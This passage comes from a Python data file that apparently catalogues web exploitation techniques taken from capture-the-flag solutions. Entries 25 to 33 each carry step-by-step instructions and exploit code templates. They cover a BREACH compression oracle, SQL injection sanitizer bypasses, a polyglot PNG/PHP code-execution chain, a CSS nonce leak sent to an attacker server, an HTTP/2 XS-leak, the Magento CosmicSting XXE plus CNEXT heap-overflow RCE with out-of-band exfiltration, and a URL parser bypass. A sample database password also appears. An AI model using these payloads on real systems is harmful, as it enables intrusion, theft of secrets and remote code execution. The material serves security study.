            "tags": ["postmessage", "origin-bypass", "null-origin", "sandbox", "isamesite", "messagechannel"],
        },
    },

    # ── 25. BREACH gzip compression side-channel ────────────────
    {
        "name": "breach_gzip_compression_side_channel",
        "vuln_type": "information_disclosure",
        "sub_technique": "compression_side_channel",
        "attack_metadata": {
            "name": "BREACH gzip compression side-channel for secret extraction",
            "applies_when": (
                "Server response is gzip compressed, and the same response contains both "
                "(1) a secret value (cookie, etc.) and (2) attacker-controlled text. "
                "When the guessed characters match the secret's prefix, gzip compresses more "
                "efficiently → smaller Content-Length → character-by-character brute-force possible."
            ),
            "prerequisites": [
                "Response has gzip/deflate compression (flask-compress, nginx gzip, etc.)",
                "Secret (cookie value, etc.) is reflected in the response",
                "Attacker can insert arbitrary text into the same response",
                "Oracle exists to observe Content-Length (debug mode, timing, etc.)",
            ],
            "technique_steps_md": (
                "1. Identify endpoint where secret is included in response (e.g. cookies reflected at /search)\n"
                "2. Insert guess string into same response — e.g. pass 'cookies.*' + '<p id=key>token{s' in query\n"
                "3. Compare Content-Length after gzip compression:\n"
                "   - Correct prefix: '<p id=key>token{s' overlaps with actual '<p id=key>token{s3cr3t...' → smaller CL\n"
                "   - Wrong prefix: '<p id=key>token{x' has no overlap → larger CL\n"
                "4. Δ(Content-Length) is typically 1-3 bytes difference, identifiable\n"
                "5. Expand compression context with padding (\\x01 * N) to improve oracle accuracy\n"
                "6. Iterate through alphabet extracting one character at a time, appending to extracted prefix"
            ),
            "code_template": (
                "import requests\n\n"
                "pad = '\\x01' * 1000\n"
                "extracted = ''\n"
                "charset = 'abcdefghijklmnopqrstuvwxyz0123456789_{}!@'\n\n"
                "for pos in range(32):\n"
                "    best_char, best_cl = None, float('inf')\n"
                "    for c in charset:\n"
                "        prefix = extracted + c\n"
                "        query = {{\n"
                "            'cookies': '*',\n"
                "            f'cookies.{{pad}}<p id=key>{{prefix}}': '*',\n"
                "        }}\n"
                "        resp = requests.post('{frontend_url}/search',\n"
                "            json={{'query': query}},\n"
                "            cookies={{'key': secret_cookie}})\n"
                "        cl = int(resp.headers['Content-Length'])\n"
                "        if cl < best_cl:\n"
                "            best_cl = cl; best_char = c\n"
                "    extracted += best_char"
            ),
            "examples": [{
                "params": {
                    "compression": "flask-compress gzip (COMPRESS_MIN_SIZE=500)",
                    "secret_location": "req.cookies.key reflected via /search",
                    "oracle": "Content-Length header via debug mode + MessageChannel",
                    "padding": "\\x01 * 1000",
                    "delta": "2 bytes per correct character",
                },
                "notes": (
                    "Flask-compress default minimum size is 500 bytes — response must be large enough for gzip. "
                    "Query user data together to exceed threshold. "
                    "Use debug mode (window.debug.param='Content-Length') to receive "
                    "fetch response header via MessageChannel to construct the oracle."
                ),
            }],
            "tags": ["breach", "compression-oracle", "gzip", "side-channel", "content-length", "cookie-extraction"],
        },
    },

    # ── 26. Broken sanitize function → SQL escape bypass for non-string types ──
    {
        "name": "python_sql_escape_type_bypass",
        "vuln_type": "sqli",
        "sub_technique": "escape_type_bypass",
        "attack_metadata": {
            "name": "Python sql_escape type-confusion bypass — non-string values skip sanitization",
            "applies_when": (
                "A Python/Flask API uses a custom sql_escape function that only sanitizes string values "
                "(isinstance(val, str)) before interpolating into SQL via str.format() or % formatting. "
                "If the sanitize helper itself has a calling-convention bug (e.g., missing argument) that "
                "crashes on string inputs, ALL string-bearing requests fail with 500, while non-string JSON "
                "values (int, bool, dict, list of ints) pass through unescaped. Attackers can submit "
                "non-string typed JSON values that get format()-interpolated into raw SQL."
            ),
            "prerequisites": [
                "Custom sql_escape iterates JSON body keys and only escapes isinstance(val, str)",
                "sanitize() function has a calling bug (e.g., sanitize(val) instead of sanitize(conn, val)) causing TypeError on strings",
                "SQL queries use str.format() or % formatting with the unsanitized values",
                "express.json() / Flask request.get_json() parses full JSON types (int, bool, dict, null)",
            ],
            "technique_steps_md": (
                "1. Identify sql_escape: check if it only covers isinstance(val, str) — dicts/ints/bools pass through\n"
                "2. Confirm sanitize bug: send a request with string values → 500 Internal Server Error\n"
                "3. Send non-string values (integers, bools) that pass sql_escape without error\n"
                "4. The value is interpolated into SQL via format() — integer pid works for normal queries\n"
                "5. For UPDATE statements like `checksum = checksum + {}`, non-string values produce valid SQL\n"
                "6. Combine with direct DB access if available to achieve full exploitation"
            ),
            "code_template": (
                "import requests\n"
                "# String values crash sql_escape\n"
                "r = requests.post(f'{url}/endpoint', json={'field': 'string_value'})  # → 500\n"
                "# Non-string values bypass sql_escape\n"
                "r = requests.post(f'{url}/endpoint', json={'field': 123})  # → 200, value interpolated raw\n"
                "# SQL: SELECT * FROM table WHERE field = '123'"
            ),
            "examples": [{
                "params": {
                    "sql_escape_bug": "sanitize(val) instead of sanitize(conn, val) → TypeError on strings",
                    "bypass_type": "integer/bool/dict values skip isinstance(val, str) branch",
                    "affected_endpoints": "All POST endpoints using json_body() → sql_escape()",
                },
                "notes": (
                    "The broken sanitize effectively disables ALL string-based SQL escaping. "
                    "Normal app functionality (join, login) is broken. Exploitation relies on "
                    "non-string JSON types or direct DB access."
                ),
            }],
            "tags": ["sqli", "type-confusion", "sanitize-bypass", "python", "flask", "json-type"],
        },
    },

    # ── 27. Polyglot PNG + PHP LFI via include with DB-controlled path ──
    {
        "name": "polyglot_png_php_include_rce",
        "vuln_type": "lfi",
        "sub_technique": "polyglot_file_rce",
        "attack_metadata": {
            "name": "Polyglot PNG with appended PHP code + LFI via include with DB-controlled path",
            "applies_when": (
                "A PHP app has an `include $path;` statement where $path comes from a database column, "
                "and the attacker can modify that column (via SQL injection or direct DB access). "
                "A file upload endpoint validates images via exif_imagetype() / getimagesize() but "
                "does not strip data after the PNG IEND marker. By appending `<?php ... ?>` after "
                "the IEND chunk, the file passes image validation while containing executable PHP. "
                "Setting the DB path to point to the uploaded image triggers PHP execution on include."
            ),
            "prerequisites": [
                "PHP `include $path;` where $path is read from a DB column",
                "Attacker can modify the DB column (SQLi, direct DB access, or admin feature)",
                "File upload validates image type (exif_imagetype, getimagesize) but does not re-encode",
                "short_open_tag = Off (PHP 8.x default) to avoid `<?` in PNG binary triggering parse errors",
                "No open_basedir restriction blocking the uploaded image path",
            ],
            "technique_steps_md": (
                "1. Create minimal valid PNG (e.g., 1x1 pixel): PNG signature + IHDR + IDAT + IEND\n"
                "2. Append PHP payload after IEND: `<?php echo file_get_contents('/flag_path'); ?>`\n"
                "3. Upload the polyglot PNG via the image upload endpoint\n"
                "4. Capture the server-assigned filename (e.g., sha256(random).png)\n"
                "5. Modify the DB to set the include path to the uploaded image:\n"
                "   UPDATE product SET product_cache = '../image/{hash}.png' WHERE pid = N;\n"
                "6. Trigger the include via the product card endpoint:\n"
                "   GET /product_card.php?pid=N&cache=../image/{hash}.png\n"
                "7. PHP outputs PNG binary (garbage) then executes appended PHP → flag in response"
            ),
            "code_template": (
                "import struct, zlib, io, requests, mysql.connector\n\n"
                "# 1. Build polyglot PNG+PHP\n"
                "def make_png_php(php_code):\n"
                "    sig = b'\\x89PNG\\r\\n\\x1a\\n'\n"
                "    def chunk(t, d): c=t+d; return struct.pack('>I',len(d))+c+struct.pack('>I',zlib.crc32(c)&0xFFFFFFFF)\n"
                "    ihdr = struct.pack('>IIBBBBB',1,1,8,2,0,0,0)\n"
                "    raw = b'\\x00\\xff\\x00\\x00'\n"
                "    return sig + chunk(b'IHDR',ihdr) + chunk(b'IDAT',zlib.compress(raw)) + chunk(b'IEND',b'') + php_code.encode()\n\n"
                "png = make_png_php('<?php echo file_get_contents(\"{flag_path}\"); ?>')\n"
                "# 2. Upload\n"
                "resp = requests.post('{url}/upload', files={{'image': ('e.png', io.BytesIO(png), 'image/png')}})\n"
                "# 3. Parse filename, 4. Update DB, 5. Trigger include"
            ),
            "examples": [{
                "params": {
                    "upload_endpoint": "POST /ymp_internal/upload_action.php",
                    "include_endpoint": "GET /ymp_internal/product_card.php?pid=N&cache=PATH",
                    "db_column": "product.product_cache",
                    "image_validation": "exif_imagetype() + getimagesize() + extension allowlist (jpg/png)",
                    "flag_path": "/flag_*.txt",
                },
                "notes": (
                    "PNG IEND marks the end of image data — anything after it is ignored by image parsers "
                    "but is processed by PHP's include. The DB path uses relative traversal (../image/) "
                    "to reach the uploaded file from the include's working directory."
                ),
            }],
            "tags": ["polyglot", "png", "php", "lfi", "include", "rce", "file-upload", "image-validation-bypass"],
        },
    },

    # ── 28. Hardcoded DB credentials + exposed port → direct DB manipulation ──
    {
        "name": "exposed_db_credentials_direct_manipulation",
        "vuln_type": "information_disclosure",
        "sub_technique": "exposed_credentials",
        "attack_metadata": {
            "name": "Hardcoded DB credentials with exposed port → direct database manipulation",
            "applies_when": (
                "Application source code contains hardcoded database credentials (in config files, "
                "ORM configs, or PHP/Python source), AND the database port is exposed externally "
                "(via docker-compose port mapping or firewall misconfiguration). Attackers connect "
                "directly to the DB, bypassing all application-level access controls, input validation, "
                "and broken sanitization. Enables: reading secrets, modifying user roles, inserting "
                "arbitrary records, and setting up further exploitation (e.g., LFI path injection)."
            ),
            "prerequisites": [
                "DB credentials visible in source code (dbutil.py, config.php, .env, docker-compose.yml, etc.)",
                "Database port reachable from attacker's network (docker-compose ports: mapping, no firewall)",
                "DB user has sufficient privileges (INSERT, UPDATE, SELECT at minimum)",
            ],
            "technique_steps_md": (
                "1. Identify DB credentials in source: connection strings, config files, docker-compose.yml\n"
                "2. Confirm DB port is accessible: connect from attacker machine to host:port\n"
                "3. Enumerate the schema: SHOW TABLES, DESCRIBE table_name\n"
                "4. Read application secrets: SELECT * FROM config (secret_key, API keys, etc.)\n"
                "5. Escalate privileges: UPDATE user SET is_admin=1 WHERE username='attacker'\n"
                "6. Inject exploit data: UPDATE product SET product_cache='../image/malicious.png'\n"
                "7. Forge auth tokens using extracted secrets if needed"
            ),
            "code_template": (
                "import mysql.connector\n"
                "conn = mysql.connector.connect(host='{host}', port={db_port},\n"
                "    user='{db_user}', password='{db_pass}', database='{db_name}')\n"
                "cur = conn.cursor()\n"
                "# Read secrets\n"
                "cur.execute('SELECT * FROM config')\n"
                "# Modify data for further exploitation\n"
                "cur.execute(\"UPDATE product SET product_cache=%s WHERE pid=%s\", (payload_path, pid))\n"
                "conn.commit()"
            ),
            "examples": [{
                "params": {
                    "db_type": "MySQL",
                    "credentials_location": "dbutil.py (Python) + upload_action.php (PHP)",
                    "exposed_port": "23434 → MySQL 3306",
                    "privileges": "ALL PRIVILEGES on ymp.*",
                },
                "notes": (
                    "docker-compose.yml maps MySQL port 23434:3306 externally. "
                    "Credentials ymp/H4ppyH4ppyM0n3y found in both Python dbutil.py and PHP sources. "
                    "Combined with polyglot PNG upload + LFI include for full RCE chain."
                ),
            }],
            "tags": ["credentials", "exposed-db", "mysql", "direct-access", "privilege-escalation", "docker"],
        },
    },

    # ── 29. CSS attribute selector nonce exfiltration → CSP bypass ──
    {
        "name": "css_attribute_selector_nonce_exfil",
        "vuln_type": "xss",
        "sub_technique": "css_attribute_exfil",
        "attack_metadata": {
            "name": "CSS attribute selector nonce exfiltration — CSP bypass via style-src unsafe-inline",
            "applies_when": (
                "A web page uses CSP with `script-src 'nonce-<random>'` to restrict scripts, but "
                "allows `style-src 'unsafe-inline'`. The nonce value is present in the DOM as an "
                "attribute on a `<script>` tag. Attacker can inject HTML via innerHTML/stored XSS "
                "that includes `<style>` blocks with CSS attribute selectors like "
                "`script[nonce^=\"prefix\"] { background-image: url(attacker?c=X) }`. "
                "By iterating prefix characters, the full nonce is leaked to the attacker server "
                "one character at a time. With the nonce, the attacker can inject a script tag "
                "(e.g., via `<iframe srcdoc>`) that passes the CSP nonce check."
            ),
            "prerequisites": [
                "CSP: script-src 'nonce-<value>' (blocking inline scripts without nonce)",
                "CSP: style-src 'unsafe-inline' (allowing injected <style> tags)",
                "HTML injection or stored XSS via innerHTML that preserves <style> tags",
                "Nonce value is present as an attribute in the DOM (e.g., <script nonce='...'>)",
                "Attacker can trigger multiple page renders (hashchange navigation) to iterate nonce characters",
                "External attacker server to receive CSS background-image callbacks",
            ],
            "technique_steps_md": (
                "1. Identify CSP: `script-src 'nonce-X'` + `style-src 'unsafe-inline'`\n"
                "2. Confirm innerHTML sink that preserves `<style>` tags in page content\n"
                "3. Locate `<script nonce=\"...\">` in page source — nonce is in DOM\n"
                "4. Inject CSS with attribute selectors for each candidate character:\n"
                "   ```css\n"
                "   script[nonce^=\"a\"] { background-image: url(http://attacker/leak?n=a) }\n"
                "   script[nonce^=\"b\"] { background-image: url(http://attacker/leak?n=b) }\n"
                "   ...\n"
                "   ```\n"
                "5. When CSS loads, browser requests the URL matching the actual nonce prefix\n"
                "6. Attacker server receives the hit, extends the known prefix by one character\n"
                "7. Generate new CSS payload with `script[nonce^=\"known_prefix+X\"]` for next char\n"
                "8. Use hashchange navigation to reload content on same page (nonce stays stable)\n"
                "9. Repeat until full nonce is recovered (typically 16-32 chars)\n"
                "10. Inject final XSS payload with stolen nonce:\n"
                "    `<iframe srcdoc=\"<script nonce=STOLEN src=//attacker/evil.js></script>\">`\n"
                "11. Script executes with valid nonce, reads document.cookie, exfiltrates flag"
            ),
            "code_template": (
                "# Generate CSS nonce-leak payload for one round\n"
                "charset = 'abcdefghijklmnopqrstuvwxyz0123456789'\n"
                "known_prefix = ''  # accumulated from previous rounds\n"
                "rules = []\n"
                "for c in charset:\n"
                "    rules.append(\n"
                "        f'script[nonce^=\"{known_prefix}{c}\"] {{'\n"
                "        f'  background-image: url({attacker_url}/leak?n={known_prefix}{c})'\n"
                "        f'}}'\n"
                "    )\n"
                "payload = '<style>* { display: block !important; }' + '\\n'.join(rules) + '</style>'\n"
                "# Post payload as note content, share it, navigate bot via hashchange"
            ),
            "examples": [{
                "params": {
                    "csp": "script-src 'nonce-<random16>'; frame-src 'none'; style-src 'unsafe-inline'",
                    "nonce_length": 16,
                    "nonce_charset": "a-z0-9",
                    "innerHTML_sink": "shared note content rendered via innerHTML",
                    "hashchange_rerender": "share_read.js listens for hashchange → re-fetches and re-renders",
                    "final_xss": "<iframe srcdoc=\"<script nonce=NONCE src=//evil/ex.js></script>\">",
                    "cookie_target": "FLAG cookie (httpOnly=false, sameSite=Strict)",
                },
                "notes": (
                    "The nonce is stable per page load — hashchange re-renders content but doesn't "
                    "change the nonce. `* { display: block !important }` ensures the script element "
                    "is visible for CSS background-image to fire. The bot visits with FLAG cookie "
                    "set on localhost. sameSite=Strict means the attack must execute from same origin. "
                    "CSRF via form POST to /write from attacker page creates the malicious notes."
                ),
            }],
            "tags": ["css", "nonce-exfiltration", "csp-bypass", "attribute-selector", "xss",
                     "style-injection", "innerHTML", "hashchange", "bot"],
        },
    },

    # ── 30. HTTP parameter array type confusion → sanitization bypass → SQLi ──
    {
        "name": "param_array_type_confusion_sqli",
        "vuln_type": "sqli",
        "sub_technique": "type_confusion",
        "attack_metadata": {
            "name": "HTTP parameter array type confusion — bypass string-only sanitization for SQL injection",
            "applies_when": (
                "A custom web server or framework parses HTTP POST parameters and supports array "
                "syntax like `param[0]=value`, creating a different internal type (ARRAY) vs the "
                "normal STRING type. A sanitization function (e.g., replaceString) checks if all "
                "arguments are STRING type before performing replacements. If ANY argument is not "
                "STRING, the function returns the unsanitized value. Attackers send `password[0]=SQLi` "
                "to create an ARRAY-typed value that bypasses the type check, allowing single-quote "
                "injection into SQL queries."
            ),
            "prerequisites": [
                "Server parses param[idx]=value as ARRAY type distinct from STRING",
                "Sanitization function type-checks args and skips processing for non-STRING types",
                "SQL queries are built via string interpolation/formatting with the unsanitized value",
                "ARRAY type's getStringValue() returns the raw string content preserving special chars",
            ],
            "technique_steps_md": (
                "1. Identify parameter parsing: test `param[0]=value` vs `param=value` behavior\n"
                "2. Locate sanitization: replaceString(input, \"'\", \"\") or similar SQL escaping\n"
                "3. Confirm type-checking in sanitization: if arg type != STRING, return unsanitized\n"
                "4. Send payload with array syntax: `password[0]=x' UNION SELECT secret FROM table-- -`\n"
                "5. The ARRAY-typed value bypasses replaceString type check\n"
                "6. formatString/query builder calls getStringValue() on the ARRAY, getting raw SQL payload\n"
                "7. UNION SELECT extracts target data (admin password, flag, etc.)\n"
                "8. Exfiltrated data appears in JWT token payload, response body, or error message"
            ),
            "code_template": (
                "import subprocess, base64, json, sys\\n"
                "url = sys.argv[1]\\n"
                "# Array syntax password[0] creates ARRAY type, bypassing replaceString\\n"
                "payload = \\\"asdf' union select password from user where username='admin'-- -\\\"\\n"
                "r = subprocess.check_output([\\n"
                "    'curl', f'{url}/login', '-X', 'POST', '-d',\\n"
                "    f'username=a&password[0]={payload}'\\n"
                "])\\n"
                "# Extract JWT token from Set-Cookie or response body\\n"
                "token = r[r.find(b'token=')+6:r.find(b\\\"';\\\")].decode()\\n"
                "payload_b64 = token.split('.')[1]\\n"
                "print(json.loads(base64.b64decode(payload_b64 + '==')))"
            ),
            "examples": [{
                "params": {
                    "server": "Custom C++ HTTP server with custom .cg template language",
                    "array_syntax": "password[0]=value → ArrayValue (type=ARRAY)",
                    "sanitizer": "replaceString(v1, v2, v3) checks all args for STRING type",
                    "sanitizer_bypass": "ARRAY type for v1 → type check fails → v1 returned raw",
                    "sqli_sink": "formatString('SELECT username FROM USER WHERE password=%', password)",
                    "exfil": "UNION SELECT extracts admin password (=flag) into JWT username field",
                },
                "notes": (
                    "The C++ replaceString checks `v1->getType() != ValueType::STRING` and returns v1 "
                    "unchanged. Array param syntax `password[0]=...` creates ValueType::ARRAY. "
                    "formatString uses getStringValue() which works for any type, preserving the raw "
                    "SQL injection payload. The flag is stored as the admin user's password in SQLite."
                ),
            }],
            "tags": ["sqli", "type-confusion", "array-syntax", "sanitization-bypass",
                     "custom-server", "jwt", "sqlite"],
        },
    },

    # ── 31. HTTP/2 stream exhaustion XS-Leak via pending response oracle ──
    {
        "name": "http2_stream_exhaustion_xs_leak",
        "vuln_type": "information_disclosure",
        "sub_technique": "xs_leak_http2",
        "attack_metadata": {
            "name": "HTTP/2 stream multiplexing exhaustion — XS-Leak via pending response oracle",
            "applies_when": (
                "A web application is served behind an HTTP/2-enabled reverse proxy (nginx with `http2 on`) "
                "that has a limited number of concurrent streams per connection (default 128). An endpoint "
                "returns a pending/incomplete response for certain inputs (e.g., missing file → NestJS `return;` "
                "without `res.sendFile()` when using `@Res()` without passthrough). Another endpoint performs "
                "a prefix-based file lookup that returns data for correct prefixes but hangs for wrong ones. "
                "The application uses `SameSite=None; Secure` cookies and `frame-ancestors: *` CSP, allowing "
                "cross-site iframe embedding with authenticated context. A side-channel view-count mechanism "
                "(e.g., POST `/api/memo/:id/view` after rendering) serves as the oracle."
            ),
            "prerequisites": [
                "HTTP/2 enabled on reverse proxy with limited concurrent streams (nginx default: 128)",
                "Endpoint that returns pending/hanging response for invalid inputs (NestJS @Res() without passthrough)",
                "Admin-only endpoint with prefix-based file matching (file.startsWith(input))",
                "SameSite=None + Secure cookie → cross-site iframe sends credentials",
                "CSP frame-ancestors: * → page embeddable in attacker iframe",
                "View count or similar side-effect that depends on remaining available streams",
                "Bot that visits attacker-controlled URL while authenticated as admin",
                "DOMPurify-sanitized HTML allowing <img> tags with same-origin src",
            ],
            "technique_steps_md": (
                "1. Identify HTTP/2 behind nginx: check `http2 on` in nginx.conf, default 128 streams\n"
                "2. Find pending response endpoint: `/api/image?filename=nonexistent` hangs (NestJS @Res() bug)\n"
                "3. Find prefix-match admin endpoint: `/api/image/admin?filename=flag_X` returns image or hangs\n"
                "4. Confirm SameSite=None cookie + frame-ancestors: * CSP\n"
                "5. Create N memos (one per candidate char), each containing:\n"
                "   - 127 `<img src=\"/api/image?filename=N\">` to occupy 127 of 128 streams with pending responses\n"
                "   - 1 `<img src=\"/api/image/admin?filename=prefix_GUESS\">` as the 128th stream\n"
                "6. Share each memo and collect sharedKeys\n"
                "7. Host attacker page that loads each shared memo in sequential iframes\n"
                "8. Bot visits attacker page → admin cookie sent → iframes load in admin context\n"
                "9. For correct guess: admin image returns → connection freed → view POST succeeds → views=1\n"
                "10. For wrong guess: all 128 streams blocked → view POST queued → views=0\n"
                "11. Check view counts as oracle → extract one character per round\n"
                "12. Repeat for each hex character of the flag filename"
            ),
            "code_template": (
                "// Create 16 memos (0-9a-f), each blocking 127 streams + 1 guess stream\\n"
                "const CHARS = '0123456789abcdef';\\n"
                "const TEMPLATE = Array.from({length: 127}, (_, i) =>\\n"
                "    `<img src=\\\"/api/image?filename=${i+1}\\\">`\\n"
                ").join('');\\n"
                "for (let c of CHARS) {\\n"
                "    await createMemo({\\n"
                "        title: 'test_' + c,\\n"
                "        content: TEMPLATE + `<img src=\\\"/api/image/admin?filename=${leaked}${c}\\\">`,\\n"
                "    });\\n"
                "}\\n"
                "// Share memos, bot visits iframe page, check views==1 for correct char"
            ),
            "examples": [{
                "params": {
                    "proxy": "nginx with http2 on, 128 default max concurrent streams",
                    "pending_endpoint": "/api/image?filename=N (nonexistent → NestJS return; hangs)",
                    "admin_endpoint": "/api/image/admin with startsWith() prefix file matching",
                    "cookie": "SameSite=None; Secure; HttpOnly → sent in cross-site iframes",
                    "csp": "frame-ancestors: * → any origin can iframe the app",
                    "oracle": "memo view count (POST /api/memo/:id/view) succeeds only if streams available",
                    "flag_format": "flag_{hex16}.png → 16 hex chars to leak",
                },
                "notes": (
                    "The key insight is HTTP/2 multiplexing: all requests share one TCP connection with "
                    "limited streams. By filling 127/128 streams with pending responses, only 1 stream "
                    "remains. If the guess is correct, the admin image returns and frees the connection, "
                    "allowing the view-count POST to succeed. If wrong, all 128 streams are blocked. "
                    "nginx keepalive_requests=2500 ensures no mid-leak connection reset. "
                    "sec-fetch-site: same-origin check is bypassed because <img> loads within same-origin iframe."
                ),
            }],
            "tags": ["xs-leak", "http2", "stream-exhaustion", "multiplexing", "pending-response",
                     "iframe", "samesite-none", "csp-bypass", "oracle", "prefix-match", "nestjs"],
        },
    },

    # ── 32. Magento CosmicSting XXE + CNEXT iconv RCE (CVE-2024-34102 + CVE-2024-2961) ──
    {
        "name": "magento_cosmicsting_xxe_cnext_rce",
        "vuln_type": "rce",
        "sub_technique": "xxe_to_rce_chain",
        "attack_metadata": {
            "name": "Magento CosmicSting XXE + CNEXT glibc iconv heap overflow → RCE",
            "applies_when": (
                "Magento 2.4.7 or earlier is running with PHP 8.x on a glibc version vulnerable "
                "to CVE-2024-2961 (e.g., glibc 2.35-0ubuntu3). The REST API endpoint "
                "`/rest/all/V1/guest-carts/<id>/estimate-shipping-methods` processes XML data "
                "from the `sourceData.data` field without proper XXE protection (CVE-2024-34102). "
                "If a WAF or application-level filter blocks the literal string 'DOCTYPE', it can "
                "be bypassed via JSON unicode escapes (e.g., `\\u0044OCTYPE`). The XXE provides a "
                "file-read primitive, which is then chained with CVE-2024-2961 (iconv buffer overflow "
                "in UTF-8 → ISO-2022-CN-EXT conversion) via php://filter chains to achieve RCE."
            ),
            "prerequisites": [
                "Magento <= 2.4.7 with CVE-2024-34102 (CosmicSting XXE)",
                "glibc vulnerable to CVE-2024-2961 (iconv buffer overflow)",
                "PHP 8.x with zlib and iconv extensions enabled",
                "Attacker-controlled HTTP server reachable from the Magento server (for XXE OOB exfil)",
                "php://filter, data://, and zlib.inflate wrappers available",
            ],
            "technique_steps_md": (
                "1. Identify Magento version (2.4.7): check `/magento_version` or response headers\n"
                "2. Identify glibc version via XXE file read of `/proc/self/maps` or package info\n"
                "3. Set up attacker HTTP server to receive XXE OOB exfiltration\n"
                "4. Send XXE payload via POST to `/rest/all/V1/guest-carts/test/estimate-shipping-methods`\n"
                "5. Bypass DOCTYPE filter: use `\\u0044OCTYPE` in JSON body instead of `DOCTYPE`\n"
                "6. XXE reads files via `php://filter/convert.base64-encode/resource=<path>`\n"
                "7. Read `/proc/self/maps` to get heap base address and libc path/address\n"
                "8. Download libc binary to extract symbol offsets (system, malloc, realloc)\n"
                "9. Build CNEXT exploit php://filter chain:\n"
                "   - Heap spray with zlib.inflate + dechunk + iconv filters\n"
                "   - Trigger iconv overflow (UTF-8 → ISO-2022-CN-EXT) with '劄' character\n"
                "   - Corrupt zend_mm_heap free_slot and custom_heap pointers\n"
                "   - Redirect efree → system() with command as chunk data\n"
                "10. Send the crafted filter chain via XXE → RCE achieved\n"
                "11. Execute SUID `/readflag` or read `/flag` directly"
            ),
            "code_template": (
                "import json, requests\\n"
                "# Magento CosmicSting XXE with DOCTYPE bypass\\n"
                "json_data = {\\n"
                "    'address': {'totalsReader': {'collectorList': {'totalCollector': {\\n"
                "        'sourceData': {\\n"
                "            'data': '<?xml version=\\\"1.0\\\" ?> <!DOCTYPE r [ <!ELEMENT r ANY >\\n"
                "                <!ENTITY % sp SYSTEM \\\"http://attacker/file/BASE64_PATH\\\"> %sp;\\n"
                "                %param1; ]> <r>&exfil;</r>',\\n"
                "            'options': 524290,\\n"
                "        }\\n"
                "    }}}}\\n"
                "}\\n"
                "# Bypass DOCTYPE filter with unicode escape\\n"
                "payload = json.dumps(json_data).replace('DOCTYPE', '\\\\u0044OCTYPE')\\n"
                "r = requests.post(f'{url}/rest/all/V1/guest-carts/test/estimate-shipping-methods',\\n"
                "    data=payload, headers={'Content-Type': 'application/json'})"
            ),
            "examples": [{
                "params": {
                    "magento_version": "2.4.7",
                    "glibc_version": "2.35-0ubuntu3 (vulnerable to CVE-2024-2961)",
                    "php_version": "8.1",
                    "xxe_endpoint": "/rest/all/V1/guest-carts/test/estimate-shipping-methods",
                    "filter_bypass": "\\u0044OCTYPE in JSON body bypasses strpos($input, 'DOCTYPE')",
                    "iconv_trigger": "UTF-8 → ISO-2022-CN-EXT with '劄' char causes 1-byte heap overflow",
                    "rce_method": "Overwrite zend_mm_heap custom_heap.efree → __libc_system",
                },
                "notes": (
                    "CVE-2024-34102 (CosmicSting) is a critical Magento XXE that requires no authentication. "
                    "CVE-2024-2961 (CNEXT) is a glibc iconv buffer overflow exploitable via PHP filter chains. "
                    "The combo was first published by @cfreal_ (LEXFO/AMBIONICS). The DOCTYPE filter bypass "
                    "using JSON unicode escapes is a common WAF evasion technique. The exploit uses the "
                    "`kill -9 $PPID` pattern to prevent multiple system() calls with random data."
                ),
            }],
            "tags": ["xxe", "rce", "cve-2024-34102", "cve-2024-2961", "magento", "cosmicsting",
                     "cnext", "iconv", "heap-overflow", "php-filter", "glibc", "waf-bypass"],
        },
    },

    # ── 33. URL authority parsing differential (edge canonicalization vs Go url.Parse) ──
    {
        "name": "url_authority_edge_canonicalization_bypass",
        "vuln_type": "ssrf",
        "sub_technique": "url_parsing_bypass",
        "attack_metadata": {
            "name": "URL authority parsing differential — edge canonicalization vs Go url.Parse",
            "applies_when": (
                "A Go server validates URLs using a custom edge canonicalization function that "
                "double-decodes percent-encoding (`collapseEscapedHost`), replaces CJK fullwidth dots "
                "(。．｡) with ASCII dots, and strips IPv6 bracket sections under specific conditions "
                "(both decode AND compat dot used). The validated URL is then re-parsed with Go's "
                "`url.Parse` for actual use (storage, iframe src, redirect). The edge parser resolves "
                "the authority to a trusted domain (e.g., `brief.relaydesk.local`), while `url.Parse` "
                "resolves the same URL to an attacker-controlled host (IPv6-mapped IPv4 in brackets)."
            ),
            "prerequisites": [
                "Server uses a custom edge authority canonicalization with double percent-decoding",
                "CJK/fullwidth dot normalization (。→., ．→., ｡→.) in authority parsing",
                "IPv6 bracket stripping logic conditioned on both decode AND compat dot flags",
                "Go url.Parse used as the delivery/storage parser (different from edge validation)",
                "Validation explicitly requires edgeRef.Authority != deliveryRef.Authority (parsing differential is REQUIRED by design)",
                "Attacker needs external HTTP listener reachable from the bot's browser",
            ],
            "technique_steps_md": (
                "1. Identify the URL validation flow: edge canonicalization vs Go url.Parse\n"
                "2. Craft a URL that satisfies the edge parser's trusted domain check:\n"
                "   - Double-encode a character: `%2566` → edge decodes twice → `f`\n"
                "   - Use CJK dot U+3002 (。) percent-encoded as `%E3%80%82` → edge normalizes to `.`\n"
                "   - Append `[IPv6-mapped-IPv4]:port` after the CJK dot\n"
                "   - Edge parser: strips brackets when both decode+compat flags set → sees `brief.relaydesk.local`\n"
                "3. Go url.Parse resolves the same URL differently:\n"
                "   - Single decode: `%2566` → `%66`, brackets parsed as IPv6 literal\n"
                "   - Hostname() returns the IPv6 address (attacker's IP)\n"
                "4. The stored URL (from url.Parse) points to attacker's server\n"
                "5. When rendered in iframe/redirect, the browser connects to attacker"
            ),
            "code_template": (
                "import urllib.parse\\n"
                "def callback_url(host, port, namespace):\\n"
                "    parts = [int(p) for p in host.split('.')]\\n"
                "    mapped = f'::ffff:{(parts[0]<<8)|parts[1]:x}:{(parts[2]<<8)|parts[3]:x}'\\n"
                "    return f'http://brie%2566.relaydesk.local%E3%80%82[{mapped}]:{port}/notes/{namespace}'"
            ),
            "examples": [{
                "params": {
                    "trusted_domain": "brief.relaydesk.local",
                    "edge_canon": "double percent-decode + CJK dot normalize + bracket strip",
                    "go_parser": "url.Parse → Hostname() returns IPv6 literal",
                    "url_pattern": "http://brie%2566.relaydesk.local%E3%80%82[::ffff:X:Y]:PORT/notes/...",
                    "validation_check": "edgeRef.Authority == expectedHost AND edgeRef.Authority != deliveryRef.Authority",
                },
                "notes": (
                    "This is a URL parser differential attack. The edge canonicalizer and Go's url.Parse "
                    "interpret the same URL differently. The key trick is combining: (1) double percent-encoding "
                    "(%2566 → %66 → f), (2) CJK dot 。 (U+3002, %E3%80%82) normalized to ASCII dot, and "
                    "(3) IPv6 bracket stripping when both decode and compat-dot flags are set. The NormalizeReviewLink "
                    "function explicitly requires the two parsers to disagree (deliveryRef != edgeRef), which is "
                    "the design flaw that enables the attack."
                ),
            }],
            "tags": ["url-parsing", "authority-confusion", "parser-differential", "percent-encoding",
                     "cjk-dot", "ipv6", "ssrf", "open-redirect", "go", "iframe"],
        },
    },

    # ── 34. HTML card dual-extraction: thread marker vs action link confusion ──
